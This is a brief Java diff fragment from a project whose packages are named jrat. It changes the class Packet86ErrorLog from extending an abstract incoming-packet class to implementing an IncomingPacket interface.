@@ -9,7 +9,7 @@ import jrat.common.crypto.Crypto;
 import java.io.FileInputStream;
 
 
-public class Packet86ErrorLog extends AbstractIncomingPacket {
+public class Packet86ErrorLog implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
